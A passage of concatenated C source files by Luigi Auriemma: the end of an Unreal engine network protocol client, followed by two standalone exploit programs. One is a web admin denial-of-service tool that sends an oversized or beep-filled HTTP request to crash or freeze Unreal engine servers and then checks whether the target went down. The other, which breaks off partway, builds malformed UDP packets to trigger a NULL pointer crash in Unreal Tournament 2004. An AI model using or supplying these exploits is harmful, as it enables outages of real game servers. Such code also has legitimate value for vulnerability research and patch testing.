            if(!gamestatefix[gamestatefixn]) {
                if(!fast_connect) {
                    printf("\nError: this game needs one or more GAMESTATE commands not implemented\n");
                    exit(1);
                }
                fast_connect = 0;
                gamestatefixn = 0;
            }
            printf("\n- %s", gamestatefix[gamestatefixn]);
        } else if(stristr(errmsg, "Username")) {
            if(random_username) exit(1);
            printf("\n- activate random UserName in the LOGIN command");
            random_username = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "Could not find team")) {
            if(force_team) exit(1);
            printf("\n- activate team fix");
            force_team      = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "stats")) {
            if(sendauth) exit(1);
            sendauth        = 1;
        } else if(stristr(errmsg, "CHALLENGE")) {
            challenge_fix++;
            if(challenge_fix == 1) {
                printf("\n- activate the Frontline Fuel of War challenge fix");
            } else if(!hex_challenge) {
                printf("\n- activate the hexadecimal challenge fix");
                challenge_fix = 0;
                hex_challenge = 1;
            } else {
                printf("\n"
                "Error: seems that this game requires a specific challenge-response algorithm\n"
                "\n");
                exit(1);
            }
        } else if(!strcmp(errmsg, "NOFASTCONNECT")) {
            fast_connect = 0;
        } else if(!strcmp(errmsg, "NOFIX")) {
            activate_fix(NULL);
        } else if(!strcmp(errmsg, "AAFIX")) {
            activate_fix(&aafix);
        } else if(!strcmp(errmsg, "AA3FIX")) {
            activate_fix(&aa3fix);
        } else if(!strcmp(errmsg, "U3FIX")) {
            activate_fix(&u3fix);
        } else if(!strcmp(errmsg, "UNREAL1FIX")) {
            activate_fix(&unreal1fix);
        } else if(!strcmp(errmsg, "PARIAHFIX")) {
            activate_fix(&pariahfix);
        } else if(!strcmp(errmsg, "MOVFIX")) {
            activate_fix(&movfix);
        } else if(!strcmp(errmsg, "RVFIX")) {
            activate_fix(&rvfix);
        } else if(!strcmp(errmsg, "VEGASFIX")) {
            activate_fix(&vegasfix);
        } else if(!strcmp(errmsg, "DEVAFIX")) {
            activate_fix(&devafix);
        } else if(!strcmp(errmsg, "BIAFIX")) {
            activate_fix(&biafix);
        } else {
            printf("\nError: \"%s\"\n", errmsg);
            exit(1);
        }
    }
    return(0);
}



void hex2guid(u8 *in, u8 *out) {
    int     i;

    for(i = 0; i < 16; i++) {
        if((in[0] <= ' ') || (in[1] <= ' ')) {
            printf("\nError: invalid GUID (smaller than 32 chars)\n");
            exit(1);
        }
        out[(i & ~3) + (3 - (i & 3))] = hex2byte(in);   // in the file channel there is a different order of the guid (big endian?)
        in += 2;
    }
}



u8 *hex2str(u8 *in, int *outsz) {
    int     len;
    u8      *out,
            *p,
            *limit;

    len = strlen(in);
    out = malloc(len / 2);
    limit = in + len;
    for(p = out; in < limit; in++) {
        if((in[0] <= ' ') || (in[1] <= ' ')) continue;
        *p++ = hex2byte(in);
        in++;
    }
    *outsz = p - out;
    return(out);
}



u8 hex2byte(u8 *hex) {
    static const u8 hextable[256] =
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x00\x00\x00\x00\x00\x00"
        "\x00\x0a\x0b\x0c\x0d\x0e\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x0a\x0b\x0c\x0d\x0e\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    return((hextable[hex[0]] << 4) | hextable[hex[1]]);
}



quick_thread(client, int sd) {
    int     len;
    u8      *buff;

    buff = malloc(0xffff);
    if(!buff) std_err();

    for(;;) {   // show any other incoming message
        len = recvfrom(sd, buff, 0xffff, 0, NULL, NULL);
        //if(len < 0) std_err();
        if(len < 0) break;
        unreal_parse_pck(buff, len, NULL, NULL);
    }
    free(buff);
    //printf("\n- done\n");
    //exit(1);
    return(0);
}



void activate_fix(int *fix) {
    u8      *str    = NULL;

    aafix       = 0;
    aa3fix      = 0;
    u3fix       = 0;
    rvfix       = 0;
    pariahfix   = 0;
    movfix      = 0;
    unreal1fix  = 0;
    vegasfix    = 0;
    devafix     = 0;
    biafix      = 0;
    if(fix) {
        *fix = 1;
        if(fix == &aafix)           str = "America's Army";
        else if(fix == &aa3fix)     str = "America's Army 3";
        else if(fix == &u3fix)      str = "Unreal 3 engine";
        else if(fix == &unreal1fix) str = "Unreal1";
        else if(fix == &pariahfix)  str = "Pariah/Warpath";
        else if(fix == &movfix)     str = "Men of Valor/SWRC";
        else if(fix == &rvfix)      str = "Raven Shield";
        else if(fix == &vegasfix)   str = "Rainbow Six Vegas 2";
        else if(fix == &devafix)    str = "Devastation";
        else if(fix == &biafix)     str = "Brothers in Arms";
    } else {
        str = "no";
    }
    printf("\n- %s compatibility fixes%s", str, fast_connect ? " (fast)" : "");
}



int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg) {
    int     len;
    u8      ret_buff[BUFFSZ+1];

    if(send_hexdump && in) {
        printf("\n- outgoing packet:\n");
        show_dump(in, insz, stdout);
    }

    len = send_recv(sd, in, insz, out, outsz, peer, first_time);
    if(len < 0) {
        if(len == -1) std_err();
        printf(" players_per_IP limit or timed out ");
        sleep(ONESEC);
        *errmsg = NULL;
        return(-1);
    }
    if(first_time) first_time = 0;
    if(!out) return(0);

#ifdef DUMPPCK
    static  int num = 0;
    FILE    *fd;
    char    fname[64];
    sprintf(fname, "unrealfp_pck.%03d", num++);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    fwrite(out, 1, len, fd);
    fclose(fd);
#endif

    if(!errmsg) return(len);
    *errmsg = unreal_parse_pck(out, len, chall, ret_buff);
    strcpy(out, ret_buff);
    if(*errmsg) return(-1);
    return(len);
}



u8 *rndhash(int size) {
    int         i;
    u8          *ret,
                *p;
    static u32  rnd = 0;
    static int  sel = 0;
    static u8   out[4][256];
    static const u8 hex[16] = "0123456789abcdef";

    if(!rnd) rnd = ~time(NULL);

    ret = out[sel++ & 3];
    p = ret;
    for(i = 0; i < size; i++) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        *p++ = hex[(rnd & 0xff) >> 4];
        *p++ = hex[(rnd & 0xff) & 15];
    }
    *p = 0;
    return(ret);
}



int unreal_info(struct sockaddr_in *peer) {
    u32     chall;
    int     sd,
            len,
            oldtype     = 0,
            retver      = 0;
    u8      buff[4096],
            gs3[sizeof(GS3_QUERYX) - 1],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = udp_sock(0);

    printf("\n- send info queries\n");
          send_recv(sd, GS1_QUERY, sizeof(GS1_QUERY) - 1, NULL, 0, peer, 0);
          send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, NULL, 0, peer, 0);
          send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, NULL, 0, peer, 0);
    len = send_recv(sd, NULL, 0, buff, sizeof(buff), peer, 0);
    if(len < 0) goto quit;
    if(buff[0] == '\\') {
        oldtype = 1;
    } else if(buff[0] == 9) {
        memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
        chall = atoi(buff + 5);
        gs3[7]  = chall >> 24;
        gs3[8]  = chall >> 16;
        gs3[9]  = chall >>  8;
        gs3[10] = chall;
        len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, sizeof(buff), peer, 0);
        if(len < 0) goto quit;
    }

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        oldtype ? 1 : 0, oldtype ? '\\' : '\0', oldtype ? 0 : 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport && atoi(hostport)) {
        peer->sin_port = htons(atoi(hostport));
        printf("\n- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



void fgetz(u8 *data, int len) {
    u8      *p;

    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
}



int calc_authresp(int num) {
    if(challenge_fix == 1) return((num * 178) ^ (num >> 16) ^ (num << 16) ^ 0xfe11ae23);    // FFOW
    return((num * 237) ^ (num >> 16) ^ (num << 16) ^ 0x93fe92ce);
}



int write_unrnum(int num, u8 *buff, int bits) {
    int     len;
    u8      mini[5];

    len = write_unreal_index(num, mini);
    return(write_bitmem(mini, len, buff, bits));
}



int read_unrnum(int *num, u8 *buff, int bits) {
    u8      mini[5];

    *num = 0;
    read_bitmem(buff, 5, mini, bits);
    return(bits + (read_unreal_index(mini, num) << 3));
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int read_unrser(int *num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    *num = 0;
    for(b = 1; b && (b < max); b <<= 1) {
        if(read_bitx(1, buff, &bits)) *num += b;
    }
    return(bits);
}



u8 *unreal_parse_pck(u8 *buff, int size, int *chall, u8 *ret_buff) {
    bunch_t bunch;
    int     b,
            btmp,
            blen,
            bsize,
            len,
            val4000,
            val400,
            val3ff,
            val8,
            val1000,
            ret_buffn   = 0;
    u8      *p;
    static int  retfix  = 0,
                done    = 0;
    static u8   str[BUFFSZ+1];

    if(size <= 0) return(NULL);
    if(force_fix) retfix = force_fix;
    if(chall) *chall = 0;
    if(ret_buff) ret_buff[0] = 0;

    val4000 = 0x4000;
    val3ff  = 0x3ff;
    val400  = 0x400;
    val8    = 0x8;
    val1000 = 0x1000;
    if(unreal1fix) val4000 = 0x10000;
    if(unreal1fix) val400 = 0x10000;
    if(pariahfix) val8 = 0x4;
    if(aafix) val3ff = 0x800;
    if(aa3fix) val3ff = 0x5dc;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless
    if(movfix) val1000 = 0x1e00;
    if(biafix) {
        val3ff  = 0x7ff;
        val1000 = 0x1e00;
    }

    b = buff[size - 1];
    if(!b) return(NULL);
    for(bsize = (size * 8) - 1; !(b & 0x80); b <<= 1, bsize--);

    b = 0;
    if(vegasfix) {
        if(size < 4) return(NULL);
        if(memcmp(buff, "\xff""AGO", 4)) return(NULL);
        b += 4 * 8;
    }
    b = read_unrser(&bunch.PacketId, buff, b, val4000);
    while(b < bsize) {
        if(devafix) read_bitx(1, buff, &b);
        if(read_bitx(1, buff, &b)) {
            b = read_unrser(&bunch.AckPacketId, buff, b, val4000);
            continue;
        }
        if(read_bitx(1, buff, &b)) {
            bunch.bOpen  = read_bitx(1, buff, &b);
            bunch.bClose = read_bitx(1, buff, &b);
        } else {
            bunch.bOpen  = 0;
            bunch.bClose = 0;
        }
        bunch.bReliable = read_bitx(1, buff, &b);
        b = read_unrser(&bunch.ChIndex, buff, b, val3ff);
        if(bunch.bReliable) b = read_unrser(&bunch.ChSequence, buff, b, val400);
        if(bunch.bReliable || bunch.bOpen) {
            b = read_unrser(&bunch.ChType, buff, b, val8);
        } else {
            bunch.ChType = 0;
        }

        b = read_unrser(&blen, buff, b, val1000);
        if((b + blen) > bsize) break;

        if(bunch.ChType != CHTYPE_Control) {
            b += blen;
            continue;
        }

        for(btmp = b + blen; b < btmp;) {
            b = read_unrnum(&len, buff, b);
            if((len < 0) || (len > (sizeof(str) - 1))) break; 
            b = read_bitmem(buff, len, str, b);
            str[len] = 0;
            if(verbose) printf("\n  %s\n", str);
            if(!done) done++;       // compatibility fixes ok
            if(ret_buff) {
                ret_buffn += sprintf(ret_buff + ret_buffn, "%.*s\n", BUFFSZ - ret_buffn, str);
            }
            if(chall) {
                p = strstr(str, "CHALLENGE=");
                if(p) {
                    sscanf(p + 10, hex_challenge ? "%08X" : "%i", chall);
                    *chall = calc_authresp(*chall);
                }
            }
            if(strstr(str, "FAIL") || strstr(str, "BRAWL") || strstr(str, "UPGRADE")) {
                return(str);
            }
            if(done == 1) done++;   // player accepted
        }
        b = btmp;
    }

    if(!done) {
        if(!force_fix) {
            if(force_fast) return(NULL);
            if(force_full) {
                retfix++;
            } else if(!fast_connect) {
                if(!retfix) fast_connect = 1;
                retfix++;
            } else {
                fast_connect = 0;   // it' useless for the other games
            }
        }
        if(retfix == 0)  return("NOFIX");
        if(retfix == 1)  return("AAFIX");
        if(retfix == 2)  return("U3FIX");
        if(retfix == 3)  return("UNREAL1FIX");
        if(retfix == 4)  return("PARIAHFIX");
        if(retfix == 5)  return("MOVFIX");
        if(retfix == 6)  return("RVFIX");
        if(retfix == 7)  return("AA3FIX");
        if(retfix == 8)  return("VEGASFIX");
        if(retfix == 9)  return("DEVAFIX");
        if(retfix == 10) return("BIAFIX");
        printf("\n"
            "Error: seems that this game requires a specific compatibility fix\n"
            "       try to relaunch this tool another time\n"
            "\n");
        exit(1);
    }
    if(done == 1) {
        if(fast_connect) return("NOFASTCONNECT");
        printf("\n"
            "Error: seems that this game requires a specific compatibility fix or gamestate\n"
            "       try to relaunch this tool another time\n"
            "\n");
        exit(1);
    }
    return(NULL);
}



int unreal_build_pck(u8 *buff, int pck, int channel, ...) {
    bunch_t bunch;
    va_list ap;
    int     b,
            sl,
            len,
            bpos,
            bsize,
            val4000,
            val400,
            val3ff,
            val8,
            val1000;
    u8      *s;
    static int  chanseq[256];

    val4000 = 0x4000;
    val3ff  = 0x3ff;
    val400  = 0x400;
    val8    = 0x8;
    val1000 = 0x1000;
    if(unreal1fix) val4000 = 0x10000;
    if(unreal1fix) val400 = 0x10000;
    if(pariahfix) val8 = 0x4;
    if(aafix) val3ff = 0x800;
    if(aa3fix) val3ff = 0x5dc;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless
    if(movfix) val1000 = 0x1e00;
    if(biafix) {
        val3ff  = 0x7ff;
        val1000 = 0x1e00;
    }

    if(!pck) memset(&chanseq, 0, sizeof(chanseq));
    bunch.AckPacketId   = 0;
    bunch.ChIndex       = channel - 1;  // wrong?
    bunch.ChType        = channel;
    bunch.ChSequence    = ++chanseq[channel];
    bunch.PacketId      = pck;
    bunch.bOpen         = 0;
    bunch.bClose        = 0;
    bunch.bReliable     = 1;
    if(bunch.ChSequence == 1) bunch.bOpen = 1;
    if((bug == 1) && enable_bug) bunch.ChSequence++;

    b = 0;
    if(vegasfix) {
        memcpy(buff, "\xff""AGO", 4);
        b += 4 * 8;
        bunch.PacketId = 0x3fff;    // ???
    }
    b = write_unrser(bunch.PacketId, buff, b, val4000);
    do {
        if(devafix) b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);  // not an Ack
        if(bunch.bOpen || bunch.bClose) {
            b = write_bits(1, 1, buff, b);
            b = write_bits(bunch.bOpen,  1, buff, b);
            b = write_bits(bunch.bClose, 1, buff, b);
        } else {
            b = write_bits(0, 1, buff, b);
        }
        b = write_bits(bunch.bReliable, 1, buff, b);
        b = write_unrser(bunch.ChIndex, buff, b, val3ff);
        if(bunch.bReliable) b = write_unrser(bunch.ChSequence, buff, b, val400);
        if(bunch.bReliable || bunch.bOpen) b = write_unrser(bunch.ChType, buff, b, val8);

        bpos = b;
        b = write_unrser(0, buff, b, val1000);  // reserve space for the size
        bsize = b;
        va_start(ap, channel);
        while((s = va_arg(ap, u8 *))) {
            if(bunch.ChType == CHTYPE_Control) {
                sl = strlen(s) + 1;
                if(sl == 1) continue;   // skip if "", for example cmd_plus is set to ""
                if(send_verbose) printf("\n^ %s", s);
                b = write_unrnum(sl, buff, b);
                b = write_bitmem(s, sl, buff, b);
            } else {
                sl = va_arg(ap, int);
                b = write_bitmem(s, sl, buff, b);
                s = va_arg(ap, u8 *);   // check if the next exists
                break;
            }
        }
        va_end(ap);
        write_unrser(b - bsize, buff, bpos, val1000);
    } while(s);

    // old solution
    //write_bits(0, 8, buff, b);  // zero pad
    //len = b >> 3;
    //if(!(buff[len] & 0x80)) buff[len] |= (1 << (b & 7));
    //len++;
    sl = 0x80;
    len = (b + 7) & (~7);
    if(len != b) sl = 1 << ((len - b) - 1);
    len >>= 3;
    buff[len] = sl;
    len++;

    if(send_verbose) printf("\n");

    if(len > BUFFSZ) {  // in reality it's 0xffff but the engine uses 576
        printf("\nError: your packet is too big\n");
        exit(1);
    }
    return(len);
}



int read_unreal_index(u8 *index_num, int *ret) {
    int     len,
            result;
    u8      b0 = index_num[0],
            b1 = index_num[1],
            b2 = index_num[2],
            b3 = index_num[3],
            b4 = index_num[4];

    if(u3fix || aa3fix || vegasfix || biafix) {
        *ret = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
        return(4);
    }

    result = 0;
    len    = 1;
    if(b0 & 0x40) {
        len++;
        if(b1 & 0x80) {
            len++;
            if(b2 & 0x80) {
                len++;
                if(b3 & 0x80) {
                    len++;
                    result = b4;
                }
                result = (result << 7) | (b3 & 0x7f);
            }
            result = (result << 7) | (b2 & 0x7f);
        }
        result = (result << 7) | (b1 & 0x7f);
    }
    result = (result << 6) | (b0 & 0x3f);
    if(b0 & 0x80) result = -result;
    *ret = result;
    return(len);
}



int write_unreal_index(int number, u8 *index_num) {
    int     len,
            sign = 1;

    if(u3fix || aa3fix || vegasfix || biafix) {
        index_num[0] = number & 0xff;
        index_num[1] = (number >> 8) & 0xff;
        index_num[2] = (number >> 16) & 0xff;
        index_num[3] = (number >> 24) & 0xff;
        return(4);
    }

    if(number < 0) {
        number = -number;
        sign = -1;
    }

    len = 1;
    index_num[0] = (number & 0x3f);
    if(number >>= 6) {
        index_num[0] += 0x40;
        index_num[1] = (number & 0x7f);
        len++;
        if(number >>= 7) {
            index_num[1] += 0x80;
            index_num[2] = (number & 0x7f);
            len++;
            if(number >>= 7) {
                index_num[2] += 0x80;
                index_num[3] = (number & 0x7f);
                len++;
                if(number >>= 7) {
                    index_num[3] += 0x80;
                    index_num[4] = number;
                    len++;
                }
            }
        }
    }
    if(sign < 0) index_num[0] += 0x80;
    return(len);
}



u32 read_bitx(u32 bits, u8 *in, u32 *in_bits) {
    u32     ret;

    ret = read_bits(bits, in, *in_bits);
    *in_bits += bits;
    return(ret);
}



int read_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; out++) {
        *out = read_bitx(8, in, &bits);
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif



#define VER         "0.1"
#define PORT        80

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



int rnds(u8 *data, int min, int max, int chr);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack;
    u16     port    = PORT;
    u8      buff[4096],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal engine <= Aug 2007 web admin DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            " 1 = unexploitable buffer-overflow in the logging function\n"
            "     the remote host must have the web admin server enabled\n"
            " 2 = hell bell attack, only versus Windows dedicated servers\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    p = buff;
    p += sprintf(buff, "GET /images/");
    if(attack == 1) {
        p += rnds(p, 1024, 1400, 0);
    } else if(attack == 2) {
        p += rnds(p, 500, 900,  '\a');
    } else {
        printf("\nError: wrong attack number\n");
        exit(1);
    }
    p += sprintf(p, ".gif HTTP/1.0\r\n\r\n");
    len = p - buff;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    printf("- connect...");
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    printf("ok\n");

    printf("- send %u bytes of data\n", len);
    send(sd, buff, len, 0);
    len = recv(sd, buff, sizeof(buff), 0);
    if(len < 0) std_err();

    close(sd);

    if(attack == 1) {
        sleep(ONESEC);

        printf("- now I check if it's still online\n");
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
            printf("\n  Server IS vulnerable!!!\n");
        } else {
            printf("\n  Server doesn't seem vulnerable\n");
        }
        close(sd);
    } else {
        printf("- now the server should be a hell of beeps and almost freezed\n");
    }
    return(0);
}



int rnds(u8 *data, int min, int max, int chr) {
    u32     rnd;
    int     len;
    u8      *p;
    static const uint8_t table[] =
                    "0123456789abcdef"
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    "abcdefghijklmnopqrstuvwxyz";

    rnd = time(NULL);

    len = rnd % max;
    if(len < min) len = min;

    for(p = data; len--; p++) {
        if(chr) {
            *p = chr;
        } else {
            rnd = (rnd * 0x343FD) + 0x269EC3;
            *p = table[(rnd >> 16) % (sizeof(table) - 1)];
        }
    }
    *p = 0;

    return(p - data);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        7777
#define BUFFSZ      1024    // the max supported is 576

#define GS1_QUERY   "\\info\\"



int unreal_info(struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
int write_unrser(int num, u8 *buff, int bits, int max);
int write_bitmem(u8 *in, int inlen, u8 *out, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     b,
            i,
            sd;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            *host;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal Tournament 2004 <= v3369 NULL pointer "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    host = argv[1];

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(port != 7777) unreal_info(&peer);

    printf("- send malformed packet:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    for(i = 0; i < 2; i++) {
        b = 0;
        b = write_unrser(0, buff, b, 0x4000);
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_unrser(i ? 511 : 0, buff, b, 0x3ff);
        b = write_unrser(1, buff, b, 0x400);
        b = write_unrser(i ? 2 : 1, buff, b, 0x08);
        b += write_bits(0, 8, buff, b);
        b = write_bits(1, 1, buff, b);   // ???

        send_recv(sd, buff, ((b+7)&(~7))>>3, buff, BUFFSZ, &peer, 1);
    }
    close(sd);
    printf("\n- now check the server manually\n");
    return(0);
}



int unreal_info(struct sockaddr_in *peer) {
    int     sd,
            len,
            retver      = 0;
    u8      buff[4096],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("\n- send info queries\n");
